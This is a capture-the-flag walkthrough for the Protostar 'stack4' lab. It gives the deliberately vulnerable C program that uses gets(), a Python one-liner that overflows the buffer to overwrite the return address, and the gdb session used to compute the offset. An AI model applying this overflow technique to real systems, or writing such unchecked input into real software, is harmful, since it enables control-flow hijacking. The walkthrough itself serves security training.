Source:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

Write the following: `python -c "import struct;print 'a'*(0xa8-0x60)+'b'*4 +struct.pack('<I',0x80483f4)" | ./stack4`

Sample output:
```bash
user@protostar:/opt/protostar/bin$ gdb stack4
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) disas main
Dump of assembler code for function main:
0x08048408 <main+0>:    push   ebp
0x08048409 <main+1>:    mov    ebp,esp
0x0804840b <main+3>:    and    esp,0xfffffff0
0x0804840e <main+6>:    sub    esp,0x50
0x08048411 <main+9>:    lea    eax,[esp+0x10]
0x08048415 <main+13>:   mov    DWORD PTR [esp],eax
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave
0x0804841e <main+22>:   ret
End of assembler dump.
(gdb) b *0x8048415
Breakpoint 1 at 0x8048415: file stack4/stack4.c, line 15.
(gdb) r
Starting program: /opt/protostar/bin/stack4

Breakpoint 1, 0x08048415 in main (argc=1, argv=0xbffff854) at stack4/stack4.c:15
15      stack4/stack4.c: No such file or directory.
        in stack4/stack4.c
(gdb) info registers eax
eax            0xbffff760       -1073744032
(gdb) info registers ebp
ebp            0xbffff7a8       0xbffff7a8
(gdb) q
A debugging session is active.

        Inferior 1 [process 2192] will be killed.

Quit anyway? (y or n) y
user@protostar:/opt/protostar/bin$ python -c "import struct;print 'a'*(0xbffff7a8-0xbffff760)+'b'*4 +struct.pack('<I',0x80483f4)" | ./stack4
code flow successfully changed
Segmentation fault
```
